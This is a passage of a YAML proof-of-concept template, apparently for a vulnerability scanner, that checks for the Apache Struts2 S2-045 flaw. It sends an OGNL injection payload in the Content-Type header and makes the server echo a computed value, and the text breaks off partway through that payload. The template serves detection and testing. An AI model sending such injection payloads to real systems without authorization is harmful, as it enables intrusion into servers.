<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">poc-yaml-struts2_045</span><br><span class="hljs-attr">set:</span><br>  <span class="hljs-attr">r1:</span> <span class="hljs-string">randomInt(800,</span> <span class="hljs-number">1000</span><span class="hljs-string">)</span><br>  <span class="hljs-attr">r2:</span> <span class="hljs-string">randomInt(800,</span> <span class="hljs-number">1000</span><span class="hljs-string">)</span><br><span class="hljs-attr">groups:</span><br>  <span class="hljs-attr">poc1:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">GET</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">$&#123;#context[&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;].addHeader(&quot;Keyvalue&quot;,&#123;&#123;r1&#125;&#125;*&#123;&#123;r2&#125;&#125;)&#125;.multi
